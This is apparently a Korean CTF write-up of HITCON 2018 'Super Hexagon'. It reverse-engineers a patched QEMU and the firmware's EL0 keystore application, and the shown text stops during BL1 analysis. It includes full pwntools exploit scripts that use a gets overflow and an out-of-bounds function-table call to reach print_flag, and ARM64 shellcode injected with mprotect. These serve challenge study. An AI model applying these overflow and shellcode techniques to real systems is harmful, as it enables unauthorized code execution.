open(flag_name, O_RDONLY); + assert(fd \u0026gt;= 0); + assert(idx \u0026gt;= 0 \u0026amp;\u0026amp; idx \u0026lt; 8); + uint32_t value[8]; + memset(value, 0, sizeof(value)); + read(fd, \u0026amp;value, sizeof(value)); + close(fd); + return value[idx]; +} + +static uint64_t hitcon_flag_word_0_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 0); +} + +static uint64_t hitcon_flag_word_1_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 1); +} + +static uint64_t hitcon_flag_word_2_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 2); +} + +static uint64_t hitcon_flag_word_3_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 3); +} + +static uint64_t hitcon_flag_word_4_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 4); +} + +static uint64_t hitcon_flag_word_5_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 5); +} + +static uint64_t hitcon_flag_word_6_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 6); +} + +static uint64_t hitcon_flag_word_7_read(CPUARMState *env, const ARMCPRegInfo *ri) +{ + return hitcon_flag_word_idx_read(env, ri, 7); +} + +static void aarch64_hitcon_initfn(Object *obj) +{ + ARMCPU *cpu = ARM_CPU(obj); + + aarch64_a57_initfn(obj); + + ARMCPRegInfo hitcon_flag_reginfo[] = { + { .name = \u0026#34;FLAG_WORD_0\u0026#34;, .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 0, + .access = PL0_RW, + .readfn = hitcon_flag_word_0_read, .writefn = arm_cp_write_ignore }, + { .name = \u0026#34;FLAG_WORD_1\u0026#34;, .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 1, + .access = PL0_RW, + .readfn = hitcon_flag_word_1_read, .writefn = arm_cp_write_ignore }, + { .name = \u0026#34;FLAG_WORD_2\u0026#34;, .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 2, + .access = PL0_RW, + .readfn = hitcon_flag_word_2_read, .writefn = arm_cp_write_ignore }, + { .name = \u0026#34;FLAG_WORD_3\u0026#34;, .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 3, + .access = PL0_RW, + .readfn = hitcon_flag_word_3_read, .writefn = arm_cp_write_ignore }, + { .name = \u0026#34;FLAG_WORD_4\u0026#34;, .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 4, + .access = PL0_RW, + .readfn = hitcon_flag_word_4_read, .writefn = arm_cp_write_ignore }, + { .name = \u0026#34;FLAG_WORD_5\u0026#34;, .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 5, + .access = PL0_RW, + .readfn = hitcon_flag_word_5_read, .writefn = arm_cp_write_ignore }, + { .name = \u0026#34;FLAG_WORD_6\u0026#34;, .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 6, + .access = PL0_RW, + .readfn = hitcon_flag_word_6_read, .writefn = arm_cp_write_ignore }, + { .name = \u0026#34;FLAG_WORD_7\u0026#34;, .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 7, + .access = PL0_RW, + .readfn = hitcon_flag_word_7_read, .writefn = arm_cp_write_ignore }, + REGINFO_SENTINEL + }; + + define_arm_cp_regs(cpu, hitcon_flag_reginfo); +} + typedef struct ARMCPUInfo { const char *name; void (*initfn)(Object *obj); @@ -266,6 +387,7 @@ { .name = \u0026#34;cortex-a57\u0026#34;, .initfn = aarch64_a57_initfn }, { .name = \u0026#34;cortex-a53\u0026#34;, .initfn = aarch64_a53_initfn }, { .name = \u0026#34;max\u0026#34;, .initfn = aarch64_max_initfn }, + { .name = \u0026#34;hitcon\u0026#34;, .initfn = aarch64_hitcon_initfn }, { .name = NULL } }; diff -Naur \u0026#39;--exclude=tests\u0026#39; \u0026#39;--exclude=roms\u0026#39; \u0026#39;--exclude=capstone\u0026#39; \u0026#39;--exclude=docs\u0026#39; ../temp/qemu-3.0.0/target/arm/op_helper.c qemu/target/arm/op_helper.c --- ../temp/qemu-3.0.0/target/arm/op_helper.c\t2018-08-14 12:10:35.000000000 -0700 +++ qemu/target/arm/op_helper.c\t2018-10-19 17:53:05.141725519 -0700 @@ -433,7 +433,7 @@ cs-\u0026gt;exception_index = EXCP_HLT; cs-\u0026gt;halted = 1; - cpu_loop_exit(cs); + exit(0); } void HELPER(wfe)(CPUARMState *env) 시스템 레지스터를 읽어서 Exception level 별로 flag를 읽을 수 있다.\n===================== Super Hexagon ===================== 1. Flags have to be read from 8 sysregs: s3_3_c15_c12_0 ~ s3_3_c15_c12_7 For example, in aarch64, you may use: mrs x0, s3_3_c15_c12_0 mrs x1, s3_3_c15_c12_1 . . . mrs x7, s3_3_c15_c12_7 For first two stages, EL0 and EL1, `print_flag\u0026#39; functions are included. Make good use of them. qemu-system-aarch64, based on qemu-3.0.0, is also patched to support this feature. See `qemu.patch\u0026#39; for more details. 2. You may add `-S -s\u0026#39; to qemu-system-aarch64 and debug with gdb-multiarch. However, if you want to debug ARM binary, you have to patch QEMU, since it always give AArch64 debug information. See `qemu-arm-debug.patch\u0026#39;. Besides, latest gdb 8.2 may be less buggy. README에서 어떤식으로 flag를 얻을 수 있는지 나와있다. 편의를 위해 모든 level 별로 flag를 읽는 함수가 정의되어있다.\nexploit 순서는 위와 같다. 각 EL 마다 취약점을 찾아서 익스플로잇하는게 주요 컨셉이다.\nDebugging environment docker compose 파일에서 SYS_PTRACE와 1234 포트를 열어서 리모트 디버깅 환경을 구축했다. 그리고 run.sh에 -s 옵션을 추가로 주도록 수정하면 된다.\nservices: super_hexagon: build: ./ volumes: - ./share:/home/super_hexagon:ro - ./xinetd:/etc/xinetd.d/super_hexagon:ro - ./tmp:/tmp:ro ports: - \u0026#34;6666:6666\u0026#34; - \u0026#34;1234:1234\u0026#34; expose: - \u0026#34;6666\u0026#34; - \u0026#34;1234\u0026#34; cap_add: - SYS_PTRACE 나중에 부득이하게 secure 물리 메모리도 확인해야해서 로컬에서도 디렉토리 구조를 만들어주고 run.sh를 수정했다.\n#!/bin/sh /home/super_hexagon/qemu-system-aarch64 -nographic -machine hitcon -cpu hitcon -bios /home/super_hexagon/bios.bin -monitor /dev/null 2\u0026gt;/dev/null -serial null -s -S EL0, Non-secure application Carving an ELF binary \u0026gt; nc localhost 6666 NOTICE: UART console initialized INFO: MMU: Mapping 0 - 0x2844 (783) INFO: MMU: Mapping 0xe000000 - 0xe204000 (40000000000703) INFO: MMU: Mapping 0x9000000 - 0x9001000 (40000000000703) NOTICE: MMU enabled NOTICE: BL1: HIT-BOOT v1.0 INFO: BL1: RAM 0xe000000 - 0xe204000 INFO: SCTLR_EL3: 30c5083b INFO: SCR_EL3: 00000738 INFO: Entry point address = 0x40100000 INFO: SPSR = 0x3c9 VERBOSE: Argument #0 = 0x0 VERBOSE: Argument #1 = 0x0 VERBOSE: Argument #2 = 0x0 VERBOSE: Argument #3 = 0x0 NOTICE: UART console initialized [VMM] RO_IPA: 00000000-0000c000 [VMM] RW_IPA: 0000c000-0003c000 [KERNEL] mmu enabled INFO: TEE PC: e400000 INFO: TEE SPSR: 1d3 NOTICE: TEE OS initialized [KERNEL] Starting user program ... === Trusted Keystore === Command: 0 - Load key 1 - Save key cmd\u0026gt; 접속을 해보면, 부팅이 되면서 위의 유저 어플리케이션이 나온다.\nbios.bin에서 리버스 엔지니어링 없이 유저 어플리케이션을 카빙할 수 있을지부터 확인했다.\n\u0026gt; binwalk bios.bin DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 143472 0x23070 SHA256 hash constants, little endian 770064 0xBC010 ELF, 64-bit LSB executable, version 1 (SYSV) 792178 0xC1672 Unix path: /lib/libc/aarch64 792711 0xC1887 Unix path: /lib/libc/aarch64 794111 0xC1DFF Unix path: /lib/libc/aarch64 796256 0xC2660 Unix path: /home/seanwu/hitcon-ctf-2018 \u0026gt; file BC010 BC010: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), statically linked, with debug_info, not stripped ELF 바이너리가 그대로 들어있어서 이를 추출해서 분석을 시작했다.\nint main(void) { int iVar1; intro(); load_trustlet(\u0026amp;TA_BIN,0x750); cmdtb[0] = cmd_load; cmdtb[1] = cmd_save; buf = (char *)mmap((void *)0x0,0x1000,0b00000011,0,0,-1); for (iVar1 = 0; iVar1 \u0026lt; 10; iVar1 = iVar1 + 1) { run(); } return 0; } void load_trustlet(char *base,int size) { int iVar1; uint ta_mem_s; int result; uint uVar2; uint tci_mem_s; void *__dest; char *ta_mem; TCI *pTVar3; void *tci_mem; ulong __len; __len = (ulong)(size + 0xfff) \u0026amp; 0xfffff000; __dest = mmap((void *)0x0,__len,3,0,0,-1); iVar1 = tc_register_wsm(__dest,__len); if (iVar1 == -1) { printf(\u0026#34;tc_register_wsm: failed to register world shared memory\\n\u0026#34;); /* WARNING: Subroutine does not return */ exit(-1); } memcpy(__dest,base,(long)size); iVar1 = tc_init_trustlet(iVar1,size); if (iVar1 == 0) { pTVar3 = (TCI *)mmap((void *)0x0,0x1000,3,0,0,-1); uVar2 = tc_register_wsm(pTVar3,0x1000); if (uVar2 != 0xffffffff) { tci_buf = pTVar3; tci_handle = uVar2; return; } printf(\u0026#34;tc_register_wsm: failed to register world shared memory\\n\u0026#34;); /* WARNING: Subroutine does not return */ exit(-1); } printf(\u0026#34;tc_init_trustlet: failed to load trustlet\\n\u0026#34;); /* WARNING: Subroutine does not return */ exit(-1); } ************************************************************* * FUNCTION ************************************************************* undefined tc_register_wsm () undefined w0:1 \u0026lt;RETURN\u0026gt; tc_register_wsm XREF[3]: Entry Point (*) , load_trustlet:00400174 (c) , load_trustlet:004001c8 (c) 00401b84 68 00 80 d2 mov x8,#0x3 00401b88 08 e0 bf f2 movk x8,#0xff00 , LSL #16 00401b8c 01 00 00 d4 svc 0x0 00401b90 c0 03 5f d6 ret ************************************************************* * FUNCTION ************************************************************* undefined tc_init_trustlet () undefined w0:1 \u0026lt;RETURN\u0026gt; tc_init_trustlet XREF[2]: Entry Point (*) , load_trustlet:0040019c (c) 00401b74 a8 00 80 d2 mov x8,#0x5 00401b78 08 e0 bf f2 movk x8,#0xff00 , LSL #16 00401b7c 01 00 00 d4 svc 0x0 00401b80 c0 03 5f d6 ret tc_ 접두사가 붙은 함수들은 trustzone과 상호작용하기 위한 함수들로 보인다. 안에 내용들을 보면 일반적인 번호가 아닌 syscall들을 호출하는 것을 확인할 수 있다. TA_Bin은 아마 S_EL0의 코드로 보인다. secure world와 normal world는 서로 world shared memory를 매핑하여 통신하는데, 이를 매핑하는 함수들이 보인다.\nvoid cmd_load(char *buf,int idx,int len) { int iVar1; iVar1 = load_key(idx,buf); if (iVar1 == 0) { printf(\u0026#34;[%d] =\u0026gt; %s\\n\u0026#34;,(ulong)(uint)idx,buf); } return; } int load_key(int x,char *buf) { byte bVar1; int i; uint uVar2; int iVar3; tci_buf-\u0026gt;cmd = 2; tci_buf-\u0026gt;index = x; tc_tci_call(tci_handle); if (tci_buf-\u0026gt;cmd == 0) { uVar2 = 0; while( true ) { if (tci_buf-\u0026gt;size \u0026lt;= uVar2) break; bVar1 = *(byte *)((long)\u0026amp;tci_buf[1].cmd + (long)(int)uVar2); buf[(int)(uVar2 \u0026lt;\u0026lt; 1)] = \u0026#34;0123456789abcdef\u0026#34;[(int)(uint)(bVar1 \u0026gt;\u0026gt; 4)]; buf[(long)(int)(uVar2 \u0026lt;\u0026lt; 1) + 1] = \u0026#34;0123456789abcdef\u0026#34;[(int)(bVar1 \u0026amp; 0xf)]; uVar2 = uVar2 + 1; } buf[tci_buf-\u0026gt;size \u0026lt;\u0026lt; 1] = \u0026#39;\\0\u0026#39;; iVar3 = 0; } else { printf(\u0026#34;load_key: failed (tci_msg: %s)\\n\u0026#34;,tci_buf + 1); iVar3 = -1; } return iVar3; } void cmd_save(char *buf,int idx,int len) { int iVar1; iVar1 = save_key(idx,buf,len); if (iVar1 == 0) { printf(\u0026#34;[%d] \u0026lt;= %s\\n\u0026#34;,(ulong)(uint)idx,buf); } return; } int save_key(int x,char *buf,int len) { uint uVar1; int iVar2; int iVar3; int iter; int size; TCI *pTVar2; uVar1 = len / 2; tci_buf-\u0026gt;cmd = 3; tci_buf-\u0026gt;index = x; pTVar2 = tci_buf; tci_buf-\u0026gt;size = uVar1; for (iter = 0; iter \u0026lt; (int)uVar1; iter = iter + 1) { iVar2 = h2i(buf[iter \u0026lt;\u0026lt; 1]); iVar3 = h2i(buf[(long)(iter \u0026lt;\u0026lt; 1) + 1]); pTVar2-\u0026gt;data[iter] = (char)iVar2 * 16 + (char)iVar3; } pTVar2-\u0026gt;data[(int)uVar1] = \u0026#39;\\0\u0026#39;; tc_tci_call(tci_handle); if (tci_buf-\u0026gt;cmd == 0) { iter = 0; } else { printf(\u0026#34;save_key: failed (tci_msg: %s)\\n\u0026#34;,tci_buf-\u0026gt;data); iter = -1; } return iter; } tci_buf→cmd와 index를 설정하고 tci_handle을 인자로 tc_tci_call을 호출한다.\n************************************************************* * FUNCTION ************************************************************* undefined tc_tci_call () undefined w0:1 \u0026lt;RETURN\u0026gt; tc_tci_call XREF[3]: Entry Point (*) , load_key:00400324 (c) , save_key:00400490 (c) 00401b94 c8 00 80 d2 mov x8,#0x6 00401b98 08 e0 bf f2 movk x8,#0xff00 , LSL #16 00401b9c 01 00 00 d4 svc 0x0 00401ba0 c0 03 5f d6 ret tci call도 생소한 번호의 시스템 콜을 호출한다.\nvoid run(void) { size_t sVar1; int iVar2; int idx; int cmd; printf(\u0026#34;cmd\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;cmd); printf(\u0026#34;index: \u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;idx); if (cmd == 1) { printf(\u0026#34;key: \u0026#34;); scanf(\u0026#34;%s\u0026#34;,buf); sVar1 = strlen(buf); iVar2 = (int)sVar1; } else { iVar2 = 0; } (*cmdtb[cmd])(buf,idx,iVar2); return; } 취약점 자체는 간단하다.\nint scanf(char *__format,...) { int iVar1; undefined8 in_x1; undefined8 in_x2; undefined8 in_x3; undefined8 in_x4; undefined8 in_x5; undefined8 in_x6; undefined8 in_x7; void *local_100; void *pvStack_f8; void *local_f0; undefined8 uStack_e8; __va_list ap; undefined auStack_40 [8]; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; undefined8 local_10; undefined8 local_8; ap.__vr_top = auStack_40; ap.__gr_offs = -0x38; ap.__vr_offs = -0x80; ap.__stack = register0x00000008; ap.__gr_top = register0x00000008; local_38 = in_x1; local_30 = in_x2; local_28 = in_x3; local_20 = in_x4; local_18 = in_x5; local_10 = in_x6; local_8 = in_x7; gets(input); local_100 = ap.__stack; pvStack_f8 = ap.__gr_top; uStack_e8 = CONCAT44(ap.__vr_offs,ap.__gr_offs); local_f0 = ap.__vr_top; iVar1 = vsscanf(input,__format,\u0026amp;local_100); return iVar1; } scanf 내부의 cmdtb보다 0x100 바이트 앞에 위치한 input에 대한 bof가 발생한다. 그리고 cmdtb에 대한 oob access가 발생한다.\n----------------------------------------------- Total ----------------------------------------------- [+] PT Entry (Total): 9 [+] PT Entry (merged consecutive pages): 6 -------------------------------------------- Memory map -------------------------------------------- Virtual address start-end Physical address start-end Total size Page size Count Flags 0x0000000000400000-0x0000000000403000 0x000000000002c000-0x000000000002f000 0x3000 0x1000 3 [EL0/R-X EL1/R-- ACCESSED GLOBAL] 0x0000000000412000-0x0000000000413000 0x000000000002f000-0x0000000000030000 0x1000 0x1000 1 [EL0/RW- EL1/RW- ACCESSED GLOBAL] 0x00007ffeffffd000-0x00007ffeffffe000 0x0000000000034000-0x0000000000035000 0x1000 0x1000 1 [EL0/RW- EL1/RW- ACCESSED GLOBAL] 0x00007ffeffffe000-0x00007ffefffff000 0x0000000000033000-0x0000000000034000 0x1000 0x1000 1 [EL0/RW- EL1/RW- ACCESSED GLOBAL] 0x00007ffefffff000-0x00007fff00000000 0x0000000000032000-0x0000000000033000 0x1000 0x1000 1 [EL0/RW- EL1/RW- ACCESSED GLOBAL] 0x00007fff7fffe000-0x00007fff80000000 0x0000000000030000-0x0000000000032000 0x2000 0x1000 2 [EL0/RW- EL1/RW- ACCESSED GLOBAL] -------------------------------------------- $TTBR1_EL1 -------------------------------------------- [+] $TTBR1_EL1: 0x1b000 [+] $TCR_EL1: 0x6080100010 [+] Intermediate Physical Address Size: 32 bits [+] EL1 Kernel Region: 0xffff000000000000 - 0xffffffffffffffff (48 bits) [+] EL1 Kernel Page Size: 4KB (per page) [+] granule_bits: 12 [+] LEVELM1_BIT_RANGE: None [+] LEVEL0_BIT_RANGE: [39, 48] [+] LEVEL1_BIT_RANGE: [30, 39] [+] LEVEL2_BIT_RANGE: [21, 30] [+] LEVEL3_BIT_RANGE: [12, 21] [+] OFFSET_BIT_RANGE: [0, 12] --------------------------------------------- LEVEL -1 --------------------------------------------- ELF 바이너리 자체는 메모리에 그대로 올라가있다. print_flag 함수가 이미 있어서 flag 얻는것 자체는 간단하다. Exploit code (flag) from pwn import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF(\u0026#39;./super_hexagon/share/_bios.bin.extracted/BC010\u0026#39;) p = remote(\u0026#39;localhost\u0026#39;,6666) payload = b\u0026#39;A\u0026#39;*0b101 + b\u0026#39;\\x00\u0026#39; payload += b\u0026#39;A\u0026#39; * (0xf8-len(payload)) payload += p64(e.sym.mprotect) payload += p64(e.sym.buf) payload += p64(e.sym.print_flag) # cmd = 1 payload += p64(0xdeadbeef)*1 assert b\u0026#39;\\r\u0026#39; not in payload and b\u0026#39;\\x0a\u0026#39; not in payload sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0)) # sz sla(b\u0026#39;key: \u0026#39;, payload) p.interactive() EL1도 exploit 하려면 안정적으로 쉘코드를 실행시킬 수 있어야한다.\n(*cmdtb[cmd])(buf,idx,len); len, idx가 컨트롤 가능하기 때문에 mprotect를 호출해서 권한을 변경할 수 있다.\n\u0026gt; python3 ex.py [+] Opening connection to localhost on port 6666: Done [*] \u0026#39;/mnt/c/Users/msh/Desktop/SuperHexagon/super_hexagon-2044407c141e2a3a49d9fb57b62c73ee/release/super_hexagon/share/_bios.bin.extracted/BC010\u0026#39; Arch: aarch64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) /mnt/c/Users/msh/Desktop/SuperHexagon/super_hexagon-2044407c141e2a3a49d9fb57b62c73ee/release/super_hexagon/ex.py:2: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes sla = lambda x,y : p.sendlineafter(x,y) [*] Paused (press any to continue) [*] Switching to interactive mode ERROR: [VMM] RWX pages are not allowed [*] Got EOF while reading in interactive $ [*] Closed connection to localhost port 6666 mprotect를 호출해서 rwx로 권한을 변경하려고 시도했지만 EL2가 rwx 페이지를 막는다. 그렇다면 처음 입력때 미리 쉘코드를 삽입하고 r-x 로 권한을 변경하고 거기로 점프하면 된다.\nExploit code (code execution) from pwn import * from keystone import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF(\u0026#39;./super_hexagon/share/_bios.bin.extracted/BC010\u0026#39;) ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN) sc_st = 0x7ffeffffd006 shellcode = b\u0026#39;\u0026#39; shellcode += bytes(ks.asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 mov w9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #0x1000 bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 mov x8, #0xe2 svc #0x1337 blr x11 \u0026#39;\u0026#39;\u0026#39;)[0]) assert b\u0026#39;\\r\u0026#39; not in shellcode and b\u0026#39;\\x0a\u0026#39; not in shellcode p = remote(\u0026#39;localhost\u0026#39;,6666) payload = b\u0026#39;A\u0026#39; * 0x100 payload += p64(0xdeadbeef) payload += p64(e.sym.gets) # cmd = 1 sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0)) sla(b\u0026#39;key: \u0026#39;, payload) sleep(0.1) payload = b\u0026#39;A\u0026#39; * 0b101 + b\u0026#39;\\x00\u0026#39; payload += shellcode p.sendline(payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0x1000)) payload = b\u0026#39;\u0026#39; payload += b\u0026#39;A\u0026#39;*0b101 + b\u0026#39;\\x00\u0026#39; payload += b\u0026#39;A\u0026#39;*(0x100 - len(payload)) payload += p64(0xdeadbeef) payload += p64(e.sym.mprotect) payload += p64(sc_st) sla(b\u0026#39;key: \u0026#39;, payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) pause() sla(b\u0026#39;index: \u0026#39;, str(1)) sleep(0.1) stack_x29_x30 = 0xffffffffc0019bb0 addr = stack_x29_x30+0x10 shellcode = f\u0026#39;\u0026#39;\u0026#39;\\ movz x1, #{((addr)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x1, #{((addr)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x1, #{((addr)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x1, #{(addr)\u0026amp;0xffff}, lsl #0 mov x0, #0 mov x2, #0x100 mov x8, #0x3f svc #0x1337 \u0026#39;\u0026#39;\u0026#39; pause() payload = bytes(ks.asm(shellcode)[0]) payload += b\u0026#39;\\x41\u0026#39; * (0x1000 - len(payload)) p.send(payload) # 0x7ffeffffd01e p.interactive() 안정적으로 쉘코드를 삽입할 수 있다. 여기 커널에선 read가 1바이트씩 읽는 것으로 구현되므로 직접 1바이트씩 읽어서 저정하도록 만들어야한다.\nReverse engineering BL1 BL1은 flash rom 위에서 돌면서 코드 무결성을 보장한다. qemu의 hitcon 머신은 처음에 간단한 초기화를 진행하고 바로 부팅을 시작한다. arm_load_kernel 코드를 직접 확인해보면, cpu는 처음에 reset을 수행하게 된다.\nhwaddr flashsize = memmap[VIRT_FLASH].size / 2; hwaddr flashbase = memmap[VIRT_FLASH].base; create_one_flash(\u0026#34;hitcon.flash0\u0026#34;, flashbase, flashsize, bios_name, secure_sysmem); create_one_flash(\u0026#34;hitcon.flash1\u0026#34;, flashbase + flashsize, flashsize, NULL, sysmem); 여기서 memmap[VIRT_FLASH].base는 0이고 bios.bin을 여기에 로드한다.\nstatic void hitcon_init(MachineState *machine) { ... // prepare boot info bootinfo.ram_size = machine-\u0026gt;ram_size; bootinfo.nb_cpus = 1; bootinfo.board_id = -1; bootinfo.firmware_loaded = true; bootinfo.loader_start = memmap[VIRT_MEM].base; bootinfo.kernel_filename = machine-\u0026gt;kernel_filename; bootinfo.kernel_cmdline = machine-\u0026gt;kernel_cmdline; bootinfo.initrd_filename = machine-\u0026gt;initrd_filename; bootinfo.skip_dtb_autoload = true; arm_load_kernel(ARM_CPU(first_cpu), \u0026amp;bootinfo); } void arm_load_kernel(ARMCPU *cpu, MachineState *ms, struct arm_boot_info *info) { CPUState *cs; AddressSpace *as = arm_boot_address_space(cpu, info); int boot_el; CPUARMState *env = \u0026amp;cpu-\u0026gt;env; int nb_cpus = 0; /* * CPU objects (unlike devices) are not automatically reset on system * reset, so we must always register a handler to do so. If we\u0026#39;re * actually loading a kernel, the handler is also responsible for * arranging that we start it correctly. */ for (cs = first_cpu; cs; cs = CPU_NEXT(cs)) { qemu_register_reset(do_cpu_reset, ARM_CPU(cs)); nb_cpus++; } /* * The board code is not supposed to set secure_board_setup unless * running its code in secure mode is actually possible, and KVM * doesn\u0026#39;t support secure. */ assert(!(info-\u0026gt;secure_board_setup \u0026amp;\u0026amp; kvm_enabled())); info-\u0026gt;kernel_filename = ms-\u0026gt;kernel_filename; info-\u0026gt;kernel_cmdline = ms-\u0026gt;kernel_cmdline; info-\u0026gt;initrd_filename = ms-\u0026gt;initrd_filename; info-\u0026gt;dtb_filename = ms-\u0026gt;dtb; info-\u0026gt;dtb_limit = 0; /* Load the kernel. */ if (!info-\u0026gt;kernel_filename || info-\u0026gt;firmware_loaded) { arm_setup_firmware_boot(cpu, info); } else { arm_setup_direct_kernel_boot(cpu, info); } ... } reset시에 호출될 do_reset 함수를 콜백으로 등록하고, rom의 0x0부터 실행을 시작한다. IROM 내부에서 돌아가는 BL0를 에뮬레이션된 부분이라고 생각하면 된다.\n이제 실질적인 부트로더 BL1을 분석한다. 0x0 번지부터 의사코드를 확인해보면 다음과 같다.\nvoid Reset(void) { ulong uVar1; sctlr_el3 = 0x30c50830; InstructionSynchronizationBarrier(); vbar_el3 = 0x2000; InstructionSynchronizationBarrier(); uVar1 = sctlr_el3; sctlr_el3 = uVar1 | 0x100a; InstructionSynchronizationBarrier(); scr_el3 = 0x238; mdcr_el3 = 0x18000; uVar1 = daif; daif = uVar1 \u0026amp; 0xfffffffffffffeff; cptr_el3 = 0; FUN_00001004(DAT_000000b8,DAT_000000c0); FUN_000010f4(DAT_000000c8,PTR_DAT_000000d0,DAT_000000d8); FUN_000010f4(DAT_000000e0,PTR_LAB_000000e8,PTR_LAB_000000e8); FUN_000010f4(DAT_000000f0,PTR_DAT_000000f8,PTR_DAT_00000100); FUN_000010f4(DAT_00000108,PTR_LAB_00000110,PTR_LAB_000000e8); spsel = 0; FUN_00000514(); FUN_000007f4(); FUN_00000fa8(); return; } 위처럼 sctlr_el3 같은 레지스터에 접근하는 것을 볼 수 있다. 시스템 레지스터 뒤에 붙은 접미사는 최소 접근 권한을 뜻한다.\nCPSR structure \u0026amp; gdbscript 처음에 부팅하고 CPSR 레지스터를 확인하면 현재의 Exception level을 알 수 있다. 위는 CPSR의 구조이다. 이를 참고하여 cpsr을 확인하는 커맨드를 추가하는 gdbscript를 작성했다. 각각의 ELx에 대해서 SP_EL0와 SP_Elx 두 가지 옵션의 전환이 지원된다. 이를 파싱하는 스크립트를 작성했다.\nimport gdb class CPSR(gdb.Command): def __init__(self): super(CPSR, self).__init__(\u0026#34;cpsr\u0026#34;, gdb.COMMAND_USER) def invoke(self, arg, from_tty): cpsr = (int(gdb.parse_and_eval(\u0026#34;$cpsr\u0026#34;))) mode = cpsr \u0026amp; 0b1111 is_thumb = (cpsr \u0026gt;\u0026gt; 4)\u0026amp;1 IRQ = (cpsr \u0026gt;\u0026gt; 7)\u0026amp;1 FIQ = (cpsr \u0026gt;\u0026gt; 6)\u0026amp;1 cond = (cpsr \u0026gt;\u0026gt; 27)\u0026amp;0b1111 re = \u0026#39;\u0026#39; if 0b0000 == mode: re += \u0026#39;EL0t\u0026#39; # SP_EL0 elif 0b0100 == mode: re += \u0026#39;EL1t\u0026#39; # SP_EL0 elif 0b0101 == mode: re += \u0026#39;EL1h\u0026#39; # SP_EL1 elif 0b1000 == mode: re += \u0026#39;EL2t\u0026#39; # SP_EL0 elif 0b1001 == mode: re += \u0026#39;EL2h\u0026#39; # SP_EL2 elif 0b1100 == mode: re += \u0026#39;EL3t\u0026#39; # SP_EL0 elif 0b1101 == mode: re += \u0026#39;EL3h\u0026#39; # SP_EL3 else: re += \u0026#39;UNK\u0026#39; re += \u0026#39;| \u0026#39; if IRQ: re += \u0026#39;IRQ_MASKED | \u0026#39; elif FIQ: re += \u0026#39;FIQ_MASKED | \u0026#39; if is_thumb: re += \u0026#39;THUMB_MODE | \u0026#39; re += f\u0026#39;COND_{hex(cond)[2:]}\u0026#39; print(re) CPSR() gdb에 로드하고 0x0 번지부터 cpsr의 값을 확인해보면 다음과 같다.\ngef\u0026gt; cpsr EL3h| FIQ_MASKED | COND_8 초기 부팅시에 코드는 EL3 코드라는 것을 알 수 있다.\nSCTLR_ELx structure 초기에 EL3로 부팅을 시작하고, 이때 virtual memory system이 활성화 되었는지 확인해야한다. M bit를 확인하면 된다. 앞서 arm manual을 정리하면서 관련 내용을 다뤘다. arm 프로세서는 power up시에 cold reset이 수행된다. 여기선 warm reset시 M bit가 0으로 세팅된다고 하지만, 앞서 정리한 메뉴얼에선 warm reset에서 reset되는 필드는 모두 cold reset에서도 reset된다고 설명했었다. 그렇기에 SCTLR_EL3.M bit는 0으로 IMPLEMENTATION DEFINED 값이다. 실제로도 0으로 세팅되어있는 것을 볼 수 있다. 0x0 번지부터 실행될 때에는 당연하지만 가상 주소가 꺼져있음을 알 수 있다.\nIdentifying exception handlers VBAR_ELx structure exception이 일어나면 exception vector에 등록된 handler가 호출된다.\nException vector structure 0x80 align 되어있다.\n00000010 80 ff 00 10 adr x0,0x2000 00000014 00 c0 1e 